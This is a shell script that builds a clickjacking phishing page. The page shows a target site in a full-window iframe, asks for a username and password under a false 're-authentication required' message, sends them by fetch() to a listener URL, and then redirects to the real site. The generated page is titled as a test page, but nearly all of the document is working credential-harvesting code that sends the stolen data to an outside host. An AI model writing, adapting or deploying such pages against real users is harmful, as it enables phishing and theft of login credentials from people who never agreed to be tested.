#!/bin/sh

## phishyclickJackPageGenerator.sh

#This script generates a clickjacking phishing file that uses a full window
#iframe to appear like the target page, but then runs a credential harvesting
#Javascript function before redirecting to the index of the target site

#The file is saved in the chosen directory and then opened in firefox.

# Usage example:
# phishyClickJackPageGenerator.sh . 'https://example.com' 'http://localhost:1234'

RED="\033[0;31m"
NC="\033[0m"

usage="./phishyclickjackPageGenerator.sh [OUTPUT DIRECTORY] \"[Target URL with http(s)]\" \"[listener URL]\""

# Display error if not enough arguments given
if [ $# -ne 3 ]; then
              printf " ${RED}Usage: ${NC} %s\n" "$usage"
fi


#output dir from argument 1
cj_outputLoc="$1"

#Quit if output directory does not exist
if [ ! -d "$cj_outputLoc" ]; then
  	printf " ${RED}ERROR: ${NC} Output Directory does not exist\nExiting now...\n"
	exit 1
fi



#URL from argument 2
cj_url="$2"
cj_cleanurl=$(echo "$cj_url" | sed -e 's/[\/:=\?\&]/_/g' | tr '.' '_' | tr -s '_')
cj_index=$(echo "$cj_url" | cut -d '/' -f -3)

#listener URL from argument 3
listener="$3"

#Bootleg creation of filename
cj_filename=$(printf "%s/TestPageClickJacking_%s.html" "$cj_outputLoc" "$cj_cleanurl")

#print the header to the file
header="<html>
<head>
<title>Clickjacking Test Page</title>
</head>
<body>
<p id=\"ptag\"></p>
"
printf "%s" "$header" >> "$cj_filename"

#Parts of the iframe element
if_p1='<iframe src=\"'
if_p2='\" \
style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; \
height:100%; border:none; margin:0; padding:0; overflow:hidden; \
z-index:999999" id="abcd" sandbox="allow-forms allow-popups allow-pointer-lock \
allow-same-origin allow-scripts"></iframe>'

#Assemble the iframe element with URL and print it to the file
printf "\n%s%s%s\n%s\n%s" "$if_p1" "$cj_url" "$if_p2" | tr -d '\\' >> "$cj_filename"

# part 1 of the JS function
# once the iframe has finished loading, prompt for credentials
#send them with fetch to a listener
code_p1="
<script>
document.getElementById('abcd').onload = function() {

do {
  var un = prompt('Re-authentication required.\nPlease enter your username:');
  var pw = prompt('Please re-enter your password to continue:');
} while(!pw || !un);

fetch('"

# part 2 of the JS function
#url with captured values, then remove the iframe show a "Redirecting" message
# then redirect to the target site's index page
code_p2="?un\='+un+'&pw\='+pw);

document.getElementById('abcd').remove();
document.getElementById('ptag').innerHTML = \"Redirecting...\";

document.location=\""

# part 3 of the JS function
# close everything up
code_p3="\";

}
</script>
"

#print the code parts and index to the file
printf "%s%s%s%s%s" "$code_p1" "$listener" "$code_p2" "$cj_index" "$code_p3" \
>> "$cj_filename"

#print the footer to the file
printf "\n</body>\n</html>\n" >> "$cj_filename"

#Open the page in firefox
firefox "$cj_filename" &

#Cleanup
unset RED NC cj_filename cj_url cj_cleanurl cj_index if_p1 if_p2 code_p1 code_p2
unset code_p3
